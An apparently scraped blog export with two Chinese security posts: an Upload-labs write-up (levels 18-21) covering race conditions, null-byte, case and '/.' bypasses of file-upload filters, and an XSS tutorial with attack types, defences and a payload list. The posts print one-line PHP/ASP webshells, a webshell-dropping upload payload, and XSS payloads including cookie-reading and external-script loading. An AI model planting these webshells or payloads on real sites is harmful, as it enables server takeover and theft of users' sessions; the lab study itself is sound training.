99).date(\u0026quot;YmdHis\u0026quot;).\u0026quot;.\u0026quot;.$file_ext; rename($upload_file, $img_path); $is_upload = true; }else{ $msg = \u0026quot;只允许上传.jpg|.png|.gif类型文件！\u0026quot;; unlink($upload_file); } }else{ $msg = '上传出错！'; } }  函数分析： rename() 函数 ：重命名文件或目录。 如果成功，该函数返回 TRUE。如果失败，则返回 FALSE。 rename(oldname,newname,context)\n代码分析：\nif(isset($_POST['submit'])){ $ext_arr = array('jpg','png','gif'); $file_name = $_FILES['upload_file']['name'];//客户端的文件名 $temp_file = $_FILES['upload_file']['tmp_name'];//临时文件名路径名称 $file_ext = substr($file_name,strrpos($file_name,\u0026quot;.\u0026quot;)+1);//截取文件的后缀 $upload_file = UPLOAD_PATH . '/' . $file_name;//拼接生成客户端文件的路径名称 if(move_uploaded_file($temp_file, $upload_file)){//将临时文件放到制定路径中 if(in_array($file_ext,$ext_arr)){//由此可见是白名单，因为只允许 jpg、png、gif 格式上传 $img_path = UPLOAD_PATH . '/'. rand(10, 99).date(\u0026quot;YmdHis\u0026quot;).\u0026quot;.\u0026quot;.$file_ext;//生成新的文件名 rename($upload_file, $img_path);//对文件进行重命名，并将新的文件目录覆盖到原来的文件目录上。 $is_upload = true;  解题思路：\n条件竞争\n条件竞争是指一个系统的运行结果依赖于不受控制的事件的先后顺序。\n当这些不受控制的事件并没有按照开发者想要的方式运行时，就可能会出现 bug。\n尤其在当前我们的系统中大量对资源进行共享，如果处理不当的话，就会产生条件竞争漏洞。\n  如果文件检测是先保存后检测，文件不合法再删除的方式进行的，典型的“引狼入室”。\n  当我们上传web shell文件时，不会先限制php类型文件上传，先利用上面的语句把上传的文件临时存放。再执行下面的if语句进行文件类型的限制和文件名的时间戳。然后执行\n  就可以利用条件竞争的方式在木马文件在被删除之前访问它，使他成功的执行\n  具体的操作过程就是，利用工具，一边不断地快速上传木马文件，一边不断的请求访问上传的木马文件，使一些来不及被删除的木马文件被成功执行\n  if(move_uploaded_file($temp_file, $upload_file))//移动到新文件夹  解题姿势：\n**利用文件重命名过程中有耗费时间的过程。临时webshell文件保存的极短时间，去访问webshell。获取一些信息。\n我们可以利用burp多线程发包，然后不断在浏览器访问我们的webshell，会有一瞬间的访问成功。（即当线程足够的时候 ，将可能会跳过某个步骤，而直接访问到我们的 webshell )\n**系统执行过程为：**当 jpg 图片上传时, 后台先生成图片的临时文件名$ tem_file路径，并且他也会拼接生成一个新的文件名 $ upoad_load路径，然后将临时文件名 $tem_file的路径放到新的文件名$ upoad_load的路径下面。之后对图片进行后缀检验 ，如果为白名单 jpg、png、gif的格式，那么将生成一个新的文件名 $ img_path路径, 并用新的路径名对之前的$ upoad_load的路径名 进行重命名覆盖。 因此，我们可以利用判断白名单时间差，结合多线程不断地对系统发送图片马php文件，当线程足够时，然后我们便能利用这个时间差，即系统没有反应过来时绕过白名单判断，成功向在文件夹中发送图片马php文件）\n不断上传文件，在文件还没被删除前去读取文件，若上传内容为\u0026lt;?php fputs(fopen('2.php','w'),'\u0026lt;?php @eval($_POST[\u0026quot;111\u0026quot;])?\u0026gt;');?\u0026gt;，则还没被删除前去读取文件，解析之后会写入一个内容为\u0026lt;?php @eval($_POST[\u0026quot;111\u0026quot;])?\u0026gt;的2.php文件。使用BurpSuite的Intruder不断上传文件并不断访问所上传的文件。 注：\u0026quot;pass\u0026quot;一定要双引号，不然单引号之间乱了。\n下面上图：\n还是先说一下思路吧：用BP抓一个上传包，再抓一个访问这个上传文件的包，然后用Intruder模块不断访问\n我这里将 webshell 命名为 3.php，然后用BP抓这个上传包\n再抓这个包，不断访问 过程和抓到的上传包一样\nupload文件夹上传成功2.php，蚁剑连接\nPASS-19 贴一下代码，及代码分析\n//index.php $is_upload = false; $msg = null; if (isset($_POST['submit'])) { require_once(\u0026quot;./myupload.php\u0026quot;); $imgFileName =time(); $u = new MyUpload($_FILES['upload_file']['name'], $_FILES['upload_file']['tmp_name'], $_FILES['upload_file']['size'],$imgFileName); //源码隐藏了，其实在这边MyUpload是一个类，这句代码的意思是定义 了MyUpload的类， //名字为 $ u ， $status_code = $u-\u0026gt;upload(UPLOAD_PATH); //这边也隐藏了函数，Upload为一个函数，将会返回以下 switch 里面case相关的值。 switch ($status_code) { case 1://为正常格式 $is_upload = true; $img_path = $u-\u0026gt;cls_upload_dir . $u-\u0026gt;cls_file_rename_to; break; case 2: $msg = '文件已经被上传，但没有重命名。';\tbreak; case -1: $msg = '这个文件不能上传到服务器的临时文件存储目录。';\tbreak; case -2: $msg = '上传失败，上传目录不可写。'; break; case -3: $msg = '上传失败，无法上传该类型文件。';\tbreak; case -4: $msg = '上传失败，上传的文件过大。';\tbreak; case -5: $msg = '上传失败，服务器已经存在相同名称文件。';\tbreak; case -6: $msg = '文件无法上传，文件不能复制到目标目录。';\tbreak; default: $msg = '未知错误！'; break; } } //myupload.php class MyUpload{ ...... var $cls_arr_ext_accepted = array( \u0026quot;.doc\u0026quot;, \u0026quot;.xls\u0026quot;, \u0026quot;.txt\u0026quot;, \u0026quot;.pdf\u0026quot;, \u0026quot;.gif\u0026quot;, \u0026quot;.jpg\u0026quot;, \u0026quot;.zip\u0026quot;, \u0026quot;.rar\u0026quot;, \u0026quot;.7z\u0026quot;,\u0026quot;.ppt\u0026quot;, \u0026quot;.html\u0026quot;, \u0026quot;.xml\u0026quot;, \u0026quot;.tiff\u0026quot;, \u0026quot;.jpeg\u0026quot;, \u0026quot;.png\u0026quot; );//黑名单 ...... /** upload() ** ** Method to upload the file. ** This is the only method to call outside the class. ** @para String name of directory we upload to ** @returns void **/ function upload( $dir ){ $ret = $this-\u0026gt;isUploadedFile();//文件是否成功上传 //$this-\u0026gt;是指向对象的XXX。在这边\u0026gt;isUploadedFile()是指函数是否是以POST形式上传，即能够判断函数是否可以返回成功。 if( $ret != 1 ){ return $this-\u0026gt;resultUpload( $ret ); } //**resultUpload（ $ret）**这个函数将会返回switch中case的相关值，从而确定switch函数的执行。 //它的执行过程为 $ret 作为相关值传递给函数resultUpload（）（里面也是 switch的相关函数， 从而达到返回 switch 中不同case的目的。）从而触发相关属性。 $ret = $this-\u0026gt;setDir( $dir );//文件目录是否成功设置 if( $ret != 1 ){ return $this-\u0026gt;resultUpload( $ret ); } $ret = $this-\u0026gt;checkExtension();//文件扩展名即后缀是否符合条件（黑名单） if( $ret != 1 ){ return $this-\u0026gt;resultUpload( $ret ); } $ret = $this-\u0026gt;checkSize();//文件大小是否符合条件 if( $ret != 1 ){ return $this-\u0026gt;resultUpload( $ret ); } // if flag to check if the file exists is set to 1 if( $this-\u0026gt;cls_file_exists == 1 ){//文件是否存在 $ret = $this-\u0026gt;checkFileExists(); if( $ret != 1 ){ return $this-\u0026gt;resultUpload( $ret ); } } // if we are here, we are ready to move the file to destination $ret = $this-\u0026gt;move();//是否成功复制上传，如果存在相同的文件名将不会成功上传 if( $ret != 1 ){ return $this-\u0026gt;resultUpload( $ret ); } // check if we need to rename the file if( $this-\u0026gt;cls_rename_file == 1 ){ //是否用$im_path成功给$upload_file重命名 $ret = $this-\u0026gt;renameFile(); if( $ret != 1 ){ return $this-\u0026gt;resultUpload( $ret ); } } // if we are here, everything worked as planned :) return $this-\u0026gt;resultUpload( \u0026quot;SUCCESS\u0026quot; ); } ......  百度说这个和18题思路一样，但是我BP传了半天也没发现php文件\u0026hellip;而且，还没上传到upload文件夹下，上传的是upload的上一层文件夹\u0026hellip;不知道什么原因，如果有大佬知道的话可以告诉一下小弟\u0026hellip;谢谢\n这里是利用了一个也算是竞争吧的方法\n通过这个代码\nif( $this-\u0026gt;cls_rename_file == 1 ){ //是否用$im_path成功给$upload_file重命名\n这边和第17关有点类似，都对关键进行了重命名，由于我们是利用burp不断的发送相同的包，那么一旦有两个包同时传到这边是，那么系统对一个重命名时，另一个刚好“逃脱”了，那么上传成功。\n解题姿势：\n在这关是一个白名单，利用了appche的一个解析漏洞，它会将 “ .php.7z ” 当作 .php来解析，而刚好 “ .php.7z ”又属于白名单，所以上传一个 “ .php.7z ” 的文件，然后 再利用条件竞争漏洞进行多线程不断的发送 “ .php.7z”的文件，由于版本问题，这次的文件没有上传到upload的文件夹下面，而是上传到 WWW 的文件夹下面，但是不影响，并且这次的文件上传后就不会被删掉，就会保存在 该文件夹下面，这样的话我们将可以稳定的访问到。\n但是又感觉不是很对，我最后是利用了文件包含漏洞\u0026hellip;但是题目中没有说可利用文件包含漏洞\u0026hellip;我是用文件包含漏洞访问的\nPASS-20 贴一下代码：\n$is_upload = false; $msg = null; if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(\u0026quot;php\u0026quot;,\u0026quot;php5\u0026quot;,\u0026quot;php4\u0026quot;,\u0026quot;php3\u0026quot;,\u0026quot;php2\u0026quot;,\u0026quot;html\u0026quot;,\u0026quot;htm\u0026quot;,\u0026quot;phtml\u0026quot;,\u0026quot;pht\u0026quot;,\u0026quot;jsp\u0026quot;,\u0026quot;jspa\u0026quot;,\u0026quot;jspx\u0026quot;,\u0026quot;jsw\u0026quot;,\u0026quot;jsv\u0026quot;,\u0026quot;jspf\u0026quot;,\u0026quot;jtml\u0026quot;,\u0026quot;asp\u0026quot;,\u0026quot;aspx\u0026quot;,\u0026quot;asa\u0026quot;,\u0026quot;asax\u0026quot;,\u0026quot;ascx\u0026quot;,\u0026quot;ashx\u0026quot;,\u0026quot;asmx\u0026quot;,\u0026quot;cer\u0026quot;,\u0026quot;swf\u0026quot;,\u0026quot;htaccess\u0026quot;); $file_name = $_POST['save_name']; $file_ext = pathinfo($file_name,PATHINFO_EXTENSION); if(!in_array($file_ext,$deny_ext)) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH . '/' .$file_name; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; }else{ $msg = '上传出错！'; } }else{ $msg = '禁止保存为该类型文件！'; } } else { $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; } }  函数分析：\n源码分析：\nif (file_exists(UPLOAD_PATH)) { //黑名单 $deny_ext = array(\u0026quot;php\u0026quot;,\u0026quot;php5\u0026quot;,\u0026quot;php4\u0026quot;,\u0026quot;php3\u0026quot;,\u0026quot;php2\u0026quot;,\u0026quot;html\u0026quot;,\u0026quot;htm\u0026quot;,\u0026quot;phtml\u0026quot;,\u0026quot;pht\u0026quot;,\u0026quot;jsp\u0026quot;,\u0026quot;jspa\u0026quot;,\u0026quot;jspx\u0026quot;,\u0026quot;jsw\u0026quot;,\u0026quot;jsv\u0026quot;,\u0026quot;jspf\u0026quot;,\u0026quot;jtml\u0026quot;,\u0026quot;asp\u0026quot;,\u0026quot;aspx\u0026quot;,\u0026quot;asa\u0026quot;,\u0026quot;asax\u0026quot;,\u0026quot;ascx\u0026quot;,\u0026quot;ashx\u0026quot;,\u0026quot;asmx\u0026quot;,\u0026quot;cer\u0026quot;,\u0026quot;swf\u0026quot;,\u0026quot;htaccess\u0026quot;); $file_name = $_POST['save_name']; $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);//**返回文件后缀名** if(!in_array($file_ext,$deny_ext)) {//黑名单判断 $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH . '/' .$file_name; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true;  如下，由源码可得，最后图片的名字 $file_name 拼接而成，因此如果在中途将 $file_name 换掉，最开始 $file_name = upload-19.jpg，如果我们中途将他换成 upload-19.php +(二进制00截断)那么便可以以我们想要的格式执行。\n解题姿势一： 00截断\n上传成功\n蚁剑连接成功\n绕过姿势二：\n大写绕过\n可以发现黑名单都是小写，所以可以利用大写绕过\n蚁剑连接成功\n绕过姿势三：\nmove_uploaded_file()有一个trick，会忽略掉文件末尾的/.。这里是用户可控的。\nmove_uploaded_file会忽略掉文件末尾的/. 所以可以构造save_path=1.php/.,这样file_ext值就为空，就能绕过黑名单，而move_uploaded_file函数忽略文件末尾的/.可以实现保存文件为.php\npost: save_name = 1.php/.\nPASS-21 贴一下代码：\n$is_upload = false; $msg = null; if(!empty($_FILES['upload_file'])){ //检查MIME $allow_type = array('image/jpeg','image/png','image/gif'); if(!in_array($_FILES['upload_file']['type'],$allow_type)){ $msg = \u0026quot;禁止上传该类型文件!\u0026quot;; }else{ //检查文件名 $file = empty($_POST['save_name']) ? $_FILES['upload_file']['name'] : $_POST['save_name']; if (!is_array($file)) { $file = explode('.', strtolower($file)); } $ext = end($file); $allow_suffix = array('jpg','png','gif'); if (!in_array($ext, $allow_suffix)) { $msg = \u0026quot;禁止上传该后缀文件!\u0026quot;; }else{ $file_name = reset($file) . '.' . $file[count($file) - 1]; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH . '/' .$file_name; if (move_uploaded_file($temp_file, $img_path)) { $msg = \u0026quot;文件上传成功！\u0026quot;; $is_upload = true; } else { $msg = \u0026quot;文件上传失败！\u0026quot;; } } } }else{ $msg = \u0026quot;请选择要上传的文件！\u0026quot;; }  相比较于上一关的源码，此处服务器端先是检查了MIME类型，然后判断save_name参数是否为空，为空就把文件本来名称赋值给$file,否则就是将save_name参数的值赋给它。紧接着判断$file是否是数组。\n如果不是数组则将其拆成数组，然后数组最后一个的值(end函数就是取数组最后一个的值)同白名单做比较，符合jpg、png、gif中的一种就允许上传了。\n在允许上传之后还要把数组的值拼接在一起对文件进行重命名。所以我们可以构造save_name[0]=1.php/ save_name[1]置为空 save_name[2]=jpg(一个白名单的合法后缀)。\n这样的话，reset($file)取的是数组的第一个元素即1.php/，然后接了一个'.\u0026lsquo;符号，之后又将数组最后一个元素内容拼接到一起。\n可能有的人会疑问数组最后一个值不是jpg吗？其实当我们只设置了两个数组元素的时候，数组的元素个数就只有两个了。\n既然一共只有两个元素，这里就是$file[2-1]也就是$file[1]。因此拼接的就是空的，最终得到的文件名就是1.php/.。\n对于像1.php/.这样的文件路径，move_uploaded_file()函数会忽略掉文件末尾的/.。如此一来我们上传到服务器的文件还是被重命名为了php后缀。\n第一步：上传文件，抓包修改参数\n蚁剑连接：\n拓展： 1、一句话木马： 指的是一句简单的脚本语言。\n php：asp：\u0026lt;%eval request (\u0026ldquo;pass\u0026rdquo;)%\u0026gt; aspx：\u0026lt;%@ Page Language=\u0026ldquo;Jscript\u0026rdquo;%\u0026gt; \u0026lt;%eval(Request.Item[\u0026ldquo;pass\u0026rdquo;],\u0026ldquo;unsafe\u0026rdquo;);%\u0026gt;\n web变种一句话\n\u0026lt;?php error_reporting(0); $_GET['POST']($_POST['GET']); ?\u0026gt;  \u0026lt;?php $POST['POST']='assert'; $array[]=$POST; $array[0]['POST']($_POST['assert']); ?\u0026gt;  文件上传漏洞巧妙绕过：\n链接1：（内容很全，概括的也多的，并且引用详细，如果不清楚值得做参考。） 点击\n总结：\n（1）、寻找上传点–\u0026gt;上传木马 （2）、XSS被动攻击 首先判断版本IS6.0的解析漏洞 （1）、没有过滤：四种工具（过waf的能力）：菜刀、冰蝎、蚁剑、 没有使用白名单的都会有问题。传上去：\u0026lt;–找文件路径（1、路劲：反弹路径名称、post，request，可能直接显示网页，2、不知路径：爆破目录—\u0026gt;upload路劲） 二、规定只能，，， 黑名单：必须上传 制作图片马（无法直接解释执行），执行办法： 1、定义路径，.php…asp等 2、。htaccsee采用，，，规则，自己定义后缀 3、采用include方式，把图片引用到某一个php中运行，（后台当中）,利用后台 4、其他，is的解析漏洞,cer，php3,php4,php5， 5、其他：多能空间（什么文件都可运行），tomcat（），运行php， 6、00截断（各种截断，利用为协议或者保存时文件发生改变），.php%00jpe 7、客户端验证：全部都可以绕过 8、操作系统特性：例如：文件 只能存288个字符如果没有哈希，那么可以利用，Windows7.0，Windows8.0等等 9、后台保存路径和后缀名的默认格式：模板编辑器（保存配置）例如：config.php 封闭前面  文件解析漏洞（即中间件漏洞）\n关于以上漏洞的相关原理，例如00截断，空格截断等等。 文件解析漏洞：是指中间件（Apache、nginx、iis等）在解析文件时出现了漏洞，从而，黑客可以利用该漏洞实现非法文件的解析。 链接：点击\n（1）、PHP解析漏洞 Apache将从右至左开始判断后缀，若x3非可识别后缀，再判断x2，一直到找到可识别后缀为止，然后将该可识别后缀进解析。Apache的文件解析过程是从右到左开始判断解析,如果为不可识别的后缀解析,就再往左判断。\n在Apache的解析中，除了“php|php3|phtml”等规定的后缀中，任何的后缀加入，都是不会被识别解析的，也会被跳过后缀处理。\n（2）、PHP CGI解析漏洞 当php的配置文件中的选项cgi.fix_pathinfo = 1开启时，当访问http://www.xxxx.com/a.txt/a.php时，若a.php不存在，则PHP会递归向前解析，将a.txt当作php脚本来解析。\nIIS中：任意文件名/任意文件名.php就会被解析为php\nNginx中：任意文件名/任意文件名.php就会被解析为php\n（3）、操作系统限制解析漏洞 由于windows系统会将文件的后缀名中空格以及点进行过滤，如果遇到是黑名单校验的，如限制不允许上传PHP文件，而受害者系统又是windows系统，那么我们可以上传jaky.php ,或者jaky.php.通过这种方式就可以绕过黑名单检验的文件上传。\n（4）、文件头欺骗漏洞 一般GIF图片用文本编辑器打开的时候，可以看到文件头是采用了“GIF89a”的字样。 （5）filepath/filetype漏洞 filepath漏洞是为了防止上传文件被重新命名归置文件而诞生的另一种攻击手段。我们可以Burp抓包来更改数据包里面的内容。将“filepath”中加入自己创建的路径名来篡改上传的文件的路径。 2、filetype漏洞主要的利用方式是利用请求数据包中的“content-type”字段.将正常请求数据包中的“content-type:images/jpeg”更改为“content-type:text/asp”再对请求的文件进行空字节截断的方式配合攻击。 （6）、空字节截断利用漏洞（%00） （7）、iconv函数限制上传 （8）、双文件并发上传漏洞（及条件竞争漏洞）## Upload labs 首刷（包含初次理解及部分函数解释及WP） PS:这只是个菜鸟的小小记录，参考很多大佬的博客，有什么不正确的地方欢迎指正\n","date":"2020-05-11","permalink":"https://Phoenix-Pl.github.io/post/upload-labs%E5%85%A8%E5%85%B3%E8%AF%A6%E8%A7%A3/","tags":["Upload-labs"],"title":"Upload-labs全关详解"},{"content":"1. XSS简介 跨站脚本攻击XSS(Cross Site Script) 为了不和层叠式演示表(Cascading Style Sheets，CSS) 的缩写混淆,故将跨站脚本攻击缩写为XSS。\nXSS跨站脚本攻击（Cross Site Scripting），的本质是攻击者在web页面嵌入恶意的script代码（这个代码可以是JS脚本、CSS样式或者其他意料之外的代码），当用户浏览该页面之时，嵌入其中的script代码会被执行，从而达到恶意攻击用户的目的。比如读取cookie，session，tokens，或者网站其他敏感的网站信息，对用户进行钓鱼欺诈等。\n1.1 XSS攻击的危害  通过 document.cookie 盗取 cookie中的信息 使用 js或 css破坏页面正常的结构与样式 流量劫持（通过访问某段具有 window.location.href 定位到其他页面） dos攻击：利用合理的客户端请求来占用过多的服务器资源，从而使合法用户无法得到服务器响应。并且通过携带过程的 cookie信息可以使服务端返回400开头的状态码，从而拒绝合理的请求服务。 利用 iframe、frame、XMLHttpRequest或上述 Flash等方式，以（被攻击）用户的身份执行一些管理动作，或执行一些一般的如发微博、加好友、发私信等操作，并且攻击者还可以利用 iframe，frame进一步的进行 CSRF 攻击。 控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力。  1.2 XSS存在的原因 XSS存在的根本原因是：\n对URL中的参数和对用户输入提交给web server的内容,没有进行充分的过滤。如果我们能够在web程序中对用户提交的URL中的参数,和提交的所有内容进行充分的过滤,将所有的不合法的参数和输入内容过滤掉,那么就不会导致“在用户的浏览器中执行攻击者自己定制的脚本”。\n2. XSS的攻击类型 2.1反射型XSS攻击 定义：\n非持久化，需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在网站搜索，跳转等。反射型XSS大多数是用来盗取用户的Cookie信息，由于需要用户主动打开恶意的URL才能生效，攻击者往往会结合多种手段诱导用户点击。\n反射型XSS的攻击步骤\n1.攻击者构造出特殊的URL，其中包含恶意代码. 2.用户打开有恶意代码的URL时，网站服务器端将恶意代码从URL取出，拼接在HTML返回给浏览器. 3.用户浏览器接收到响应后解析执行，混在其中的恶意代码也会被执行。 4.恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户行为，调用目标网站接口执行攻击者指定的操作。\n举例说明\n1.Alice经常浏览某个网站,此网站为Bob所拥有。Bob的站点需要Alice使用用户名/密码进行登录,并存储了Alice敏感信息(比如银行帐户信息)；\n2.Tom 发现 Bob的站点存在反射性的XSS漏洞；\n3.Tom 利用Bob网站的反射型XSS漏洞编写了一个exp,做成链接的形式,并利用各种手段诱使Alice点击；\n4.Alice在登录到Bob的站点后,浏览了 Tom 提供的恶意链接；\n5.嵌入到恶意链接中的恶意脚本在Alice的浏览器中执行。此脚本盗窃敏感信息(cookie、帐号信息等信息)。然后在Alice完全不知情的情况下将这些信息发送给 Tom；\n6.Tom 利用获取到的cookie就可以以Alice的身份登录Bob的站点,如果脚本的功更强大的话,Tom 还可以对Alice的浏览器做控制并进一步利用漏洞控制。\n攻击示意图：\n**注意：**Chrome和Safari能够检测到url上的xss攻击，将网页拦截掉，但是其他浏览器不行，如IE和Firefox。\n防御反射型XSS攻击\n 对输入检查 对请求参数进行检查，一旦发现可疑的特殊字符就拒绝请求。需要注意的是用户可以绕过浏览器的检查，直接通过Postman等工具进行请求，所以这个检查最好前后端都做。 对输出进行转义再显示 通过上面的介绍可以看出，反射型XSS攻击要进行攻击的话需要在前端页面进行显示。所以在输出数据之前对潜在的威胁的字符进行编码、转义也是防御XSS攻击十分有效的措施。比如下面的方式:  Copyapp.get('/welcome',function(req,res){ //对查询参数进行编码，避免反射型 XSS攻击 res.send(`${encodeURIComponent(req.query.type)}`); })  2.2 存储型XSS攻击 定义：\n存储型XSS，持久化，恶意脚本永久存储在目标服务器上。当浏览器请求数据时，脚本从服务器传回并执行，影响范围比反射型和DOM型XSS更大。\n存储型XSS攻击的原因仍然是没有做好数据过滤：\n前端提交数据至服务器端时，没有做好过滤；服务端在按收到数据时，在存储之前，没有做过滤；前端从服务器端请求到数据，没有过滤输出。\n比较常见的场景是，黑客写下一篇包含有恶意JavaScript代码的博客文章，文章发表后，所有访问该博客的用户，都会在他们的浏览器中执行这段恶意js代码。\n存储型XSS的攻击步骤\n1.攻击者将恶意代码提交到目标网站的数据库中。 2.用户打开目标网站时，网站服务端将恶意代码从数据库中取出，拼接在HTML中返回给浏览器。 3.用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。 4.恶意代码窃取用户数据并发送到攻击者的网站，或冒充用户行为，调用目标网站接口执行攻击者指定的操作. 这种攻击常见于带有用户保存数据的网站功能，如论坛发帖，商品评论，用户私信等。\n举例说明\n1.Bob拥有一个Web站点,该站点允许用户发布信息/浏览已发布的信息；\n2.Tom检测到Bob的站点存在存储型的XSS漏洞；\n3.Tom在Bob的网站上发布一个带有恶意脚本的热点信息,该热点信息存储在了Bob的服务器的数据库中,然后吸引其它用户来阅读该热点信息；\n4.Bob或者是任何的其他人如Alice浏览该信息之后,Tom的恶意脚本就会执行；\n5.Tom的恶意脚本执行后,Tom就可以对浏览器该页面的用户发动一起XSS攻击。\n攻击示意图\n预防存储型XSS攻击 预防存储型XSS攻击也是从输入和输出两个方面来考虑。\n 服务器接收到数据，在存储到数据库之前，进行转义和过滤危险字符; 前端接收到服务器传递过来的数据，在展示到页面前，先进行转义/过滤;  不论是反射型攻击还是存储型，攻击者总需要找到两个要点，即“输入点”与\u0026quot;输出点\u0026quot;，也只有这两者都满足，XSS攻击才会生效。“输入点”用于向 web页面注入所需的攻击代码，而“输出点”就是攻击代码被执行的地方。\n2.3 DOM型XSS 不经过后端,DOM-XSS漏洞是基于文档对象模型(Document Object Model,DOM)的一种漏洞,\nDOM-XSS是通过url传入参数去控制触发的,其实也属于反射型XSS。\n(dom-xss取决于输出位置，并不取决于输出环境，因此domxss既有可能是反射型的，也有可能是存储型的)\n特点：\nweb server不参与，仅仅涉及到浏览器的XSS。\n 可触发DOM-XSS的属性： document.referer window.name location innerHTML document.write   3. XSS的攻击载荷 以下所有标签的 \u0026gt; 都可以用 // 代替,例如 \u0026lt; script\u0026gt; alert(1) \u0026lt;/script//\n \u0026lt;script\u0026gt;标签：\u0026lt;script\u0026gt;标签是最直接的XSS有效载荷, 脚本标记可以引用外部的JavaScript代码,也可以将代码插入脚本标记中 ----------------------------- \u0026lt;script\u0026gt;alert(\u0026quot;hello\u0026quot;)\u0026lt;/script\u0026gt; #弹出hello \u0026lt;script\u0026gt;alert(/hello/)\u0026lt;/script\u0026gt; #弹出hello \u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt; #弹出1,对于数字可以不用引号 \u0026lt;script\u0026gt;alert(document.cookie)\u0026lt;/script\u0026gt; #弹出cookie \u0026lt;script src=http://xxx.com/xss.js\u0026gt;\u0026lt;/script\u0026gt; #引用外部的xss ------------------------------ \u0026lt;svg\u0026gt;标签： ------------------------------ \u0026lt;svg onload=\u0026quot;alert(1)\u0026quot;\u0026gt; \u0026lt;svg onload=\u0026quot;alert(1)\u0026quot;//\t------------------------------ \u0026lt;img\u0026gt;标签： ------------------------------ \u0026lt;img src=1 οnerrοr=alert(\u0026quot;hack\u0026quot;)\u0026gt; \u0026lt;img src=1 οnerrοr=alert(document.cookie)\u0026gt; #弹出cookie ------------------------------ \u0026lt;body\u0026gt;标签： ------------------------------ \u0026lt;body οnlοad=alert(1)\u0026gt; \u0026lt;body οnpageshοw=alert(1)\u0026gt; ------------------------------ \u0026lt;video\u0026gt;标签： ------------------------------ \u0026lt;video οnlοadstart=alert(1) src=\u0026quot;/media/hack-the-planet.mp4\u0026quot; /\u0026gt; ------------------------------ \u0026lt;Style\u0026gt;标签： ------------------------------ \u0026lt;style οnlοad=alert(1)\u0026gt;\u0026lt;/style\u0026gt; ------------------------------   4. XSS可以插入在那些地方  *用户输入作为script标签内容 *用户输入作为HTML注释内容 *用户输入作为HTML标签的属性名 *用户输入作为HTML标签的属性值 *用户输入作为HTML标签的名字 *直接插入到CSS里 **通过上述可插入的位置可知：千万不要引入任何不可信的第三方JavaScript到页面里！ ---------------------------------- #用户输入作为HTML注释内容,导致攻击者可以进行闭合绕过 \u0026lt;!-- 用户输入 --\u0026gt; \u0026lt;!-- --\u0026gt;\u0026lt;script\u0026gt;alert('hack')\u0026lt;/script\u0026gt;\u0026lt;!-- --\u0026gt; #用户输入作为标签属性名,导致攻击者可以进行闭合绕过 \u0026lt;div 用户输入=\u0026quot;xx\u0026quot;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div \u0026gt;\u0026lt;/div\u0026gt;\u0026lt;script\u0026gt;alert('hack')\u0026lt;/script\u0026gt;\u0026lt;div a=\u0026quot;xx\u0026quot;\u0026gt; \u0026lt;/div\u0026gt; #用户输入作为标签属性值,导致攻击者可以进行闭合绕过 \u0026lt;div id=\u0026quot;用户输入\u0026quot;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div id=\u0026quot;\u0026quot;\u0026gt;\u0026lt;/div\u0026gt;\u0026lt;script\u0026gt;alert('hack')\u0026lt;/script\u0026gt;\u0026lt;div a=\u0026quot;x\u0026quot;\u0026gt;\u0026lt;/div\u0026gt; #用户输入作为标签名,导致攻击者可以进行闭合绕过 \u0026lt;用户输入 id=\u0026quot;xx\u0026quot; /\u0026gt; \u0026lt;\u0026gt;\u0026lt;script\u0026gt;alert('hack')\u0026lt;/script\u0026gt;\u0026lt;b id=\u0026quot;xx\u0026quot; /\u0026gt; #用户输入作为CSS内容,导致攻击者可以进行闭合绕过 \u0026lt;style\u0026gt;用户输入\u0026lt;style\u0026gt; \u0026lt;style\u0026gt; \u0026lt;/style\u0026gt;\u0026lt;script\u0026gt;alert('hack')\u0026lt;/script\u0026gt;\u0026lt;style\u0026gt; \u0026lt;/style\u0026gt; ----------------------------------   5. XSS漏洞的挖掘  黑盒测试： 尽可能找到一切用户可控并且能够输出在页面代码中的地方,比如下面这些： *URL的每一个参数 *URL本身 *表单 *搜索框 --------------------- 常见业务场景： *重灾区：评论区、留言区、个人信息、订单信息等 *针对型：站内信、网页即时通讯、私信、意见反馈 *存在风险：搜索框、当前目录、图片属性等 ---------------------- 白盒测试(代码审计)： 关于XSS的代码审计主要就是从接收参数的地方和一些关键词入手： PHP中常见的接受参数$_GET、$_POST、$_REQUEST等,可以搜索所有接受参数的 地方,然后对收到的数据进行跟踪,看看有没有输出到页面中,然后看输出到页面的 数据是否进行了过滤和编码等处理。 也可以搜索类似echo这样的输出语句,跟踪输出的变量是从哪里来的,我们能否 控制,如果从数据库中取的,是否控制存到数据库中的数据,存到数据之前有没有进 行过滤等。 大多数程序会对接受参数封装在公共文件的函数中同一调用,我们就要审计这些 公共函数看看有没有过滤,能否绕过等。 同理审计DOM-XSS可以搜索一些js操作DOM元素的关键字进行审计。 ----------------------   6. XSS漏洞的简单攻击测试 6.1 反射型xss  ------------------------------------ //前端 1.html： \u0026lt;html\u0026gt; \u0026lt;head lang=\u0026quot;en\u0026quot;\u0026gt; \u0026lt;meta charset=\u0026quot;UTF-8\u0026quot;\u0026gt; \u0026lt;title\u0026gt;反射型XSS\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;form action=\u0026quot;action.php\u0026quot; method=\u0026quot;post\u0026quot;\u0026gt; \u0026lt;input type=\u0026quot;text\u0026quot; name=\u0026quot;name\u0026quot; /\u0026gt; \u0026lt;input type=\u0026quot;submit\u0026quot; value=\u0026quot;提交\u0026quot;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; ------------------------ //后端 action.php： \u0026lt;?php $name=$_POST[\u0026quot;name\u0026quot;]; echo $name; ?\u0026gt; -------------------------------------- 提交数据：\u0026lt;script\u0026gt;alert('hack')\u0026lt;/script\u0026gt; 